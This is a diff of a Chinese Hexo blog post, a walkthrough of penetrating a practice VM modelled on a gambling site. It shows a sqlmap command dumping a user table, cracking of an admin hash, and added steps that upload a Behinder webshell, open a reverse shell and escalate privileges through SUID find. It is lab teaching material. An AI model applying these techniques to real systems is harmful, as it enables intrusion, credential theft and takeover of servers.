@@ -16,12 +16,12 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="此靶机根据某博彩网站的真实环境所搭建。 搭建环境在VMwareWorkstation中导入虚拟机 开启虚拟机并登陆root账号，并查看apache服务是否开启 12ps -ef |grep httpdps -aux | grep httpd  查看ip地址 1ifconfig  渗透过程进入登录界面 注册账号并进入网站 点击商品 发现url：http:&#x2F;&#x2F;192.168.206.128&#x2F;index">
+    <meta name="description" content="此靶机根据某博彩网站的真实环境所搭建。 搭建环境在VMwareWorkstation中导入虚拟机 开启虚拟机并登陆root账号，并查看apache服务是否开启 12ps -ef |grep httpdps -aux | grep httpd  查看ip地址 1ifconfig  渗透过程进入登录界面 注册账号并进入网站 点击商品 url：http:&#x2F;&#x2F;192.168.206.128&#x2F;index&#x2F;g">
 <meta property="og:type" content="article">
 <meta property="og:title" content="对某靶机环境进行渗透测试">
 <meta property="og:url" content="http://example.com/2022/11/28/%E5%AF%B9%E6%9F%90%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="此靶机根据某博彩网站的真实环境所搭建。 搭建环境在VMwareWorkstation中导入虚拟机 开启虚拟机并登陆root账号，并查看apache服务是否开启 12ps -ef |grep httpdps -aux | grep httpd  查看ip地址 1ifconfig  渗透过程进入登录界面 注册账号并进入网站 点击商品 发现url：http:&#x2F;&#x2F;192.168.206.128&#x2F;index">
+<meta property="og:description" content="此靶机根据某博彩网站的真实环境所搭建。 搭建环境在VMwareWorkstation中导入虚拟机 开启虚拟机并登陆root账号，并查看apache服务是否开启 12ps -ef |grep httpdps -aux | grep httpd  查看ip地址 1ifconfig  渗透过程进入登录界面 注册账号并进入网站 点击商品 url：http:&#x2F;&#x2F;192.168.206.128&#x2F;index&#x2F;g">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/9c47491f80d2fe12fe91697501b1f82.png">
 <meta property="og:image" content="http://example.com/images/8108a693a1e75ef188444c52ad689fa.png">
@@ -33,8 +33,11 @@
 <meta property="og:image" content="http://example.com/images/134520.png">
 <meta property="og:image" content="http://example.com/images/140639.png">
 <meta property="og:image" content="http://example.com/images/141259.png">
+<meta property="og:image" content="http://example.com/images/143456.png">
+<meta property="og:image" content="http://example.com/images/144813.png">
+<meta property="og:image" content="http://example.com/images/154129.png">
 <meta property="article:published_time" content="2022-11-28T01:53:15.010Z">
-<meta property="article:modified_time" content="2022-12-05T06:26:33.754Z">
+<meta property="article:modified_time" content="2022-12-05T07:41:58.832Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/9c47491f80d2fe12fe91697501b1f82.png">
@@ -229,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          440 words
+          552 words
         
       </span>
     
@@ -240,7 +243,7 @@
         
         
         
-          4 mins
+          5 mins
         
       </span>
     
@@ -294,12 +297,18 @@
 <h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>进入登录界面<br><img src="/../images/101110.png" srcset="/img/loading.gif" lazyload></p>
 <p>注册账号并进入网站<br><img src="/../images/101529.png" srcset="/img/loading.gif" lazyload></p>
 <p>点击商品<br><img src="/../images/103447.png" srcset="/img/loading.gif" lazyload></p>
-<p>发现url：<a target="_blank" rel="noopener" href="http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html%E4%B8%AD%E5%8F%82%E6%95%B0pid%E5%90%8E%E9%9D%A2%E7%9A%84%E6%95%B0%E5%AD%97%E4%B8%BA%E6%B3%A8%E5%85%A5%E7%82%B9,%E7%94%A8sqlmap%E8%B7%91%E5%87%BA%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81">http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html中参数pid后面的数字为注入点,用sqlmap跑出管理员账号密码</a>(在指定注入的位置加上*）</p>
+<p>url：<a target="_blank" rel="noopener" href="http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html">http://192.168.206.128/index/goods/goods/pid/26/token/ad24fd9361665783a57e6f8be4ef67ce.html</a></p>
+<p>发现参数pid后面的数字为注入点,用sqlmap跑出管理员账号密码(在指定注入的位置加上*）</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r target.txt  --prefix <span class="hljs-string">&quot;26)&quot;</span> --suffix <span class="hljs-string">&quot;%23&quot;</span> -D weipans -T wp_userinfo --dump<br></code></pre></td></tr></table></figure>
 <p>target.txt内容:<br><img src="/../images/135657.png" srcset="/img/loading.gif" lazyload></p>
 <p>管理员密码的md5值:<br><img src="/../images/134520.png" srcset="/img/loading.gif" lazyload></p>
 <p>md5值解密：<br><img src="/../images/140639.png" srcset="/img/loading.gif" lazyload></p>
 <p>进入网站后台并在参数设置-基本设置处发现文件上传点:<br><img src="/../images/141259.png" srcset="/img/loading.gif" lazyload></p>
+<p>上传冰蝎马并通过查看页面源代码确定上传位置:<br><img src="/../images/143456.png" srcset="/img/loading.gif" lazyload></p>
+<p>连接冰蝎,利用命令执行反弹shell并利用suid提权:<br><img src="/../images/144813.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现find有suid表示位，所以可以利用find提权：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> 111<br>find 111 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \;<br></code></pre></td></tr></table></figure>
+<p>提权成功：<br><img src="/../images/154129.png" srcset="/img/loading.gif" lazyload></p>
 
                 
               </div>
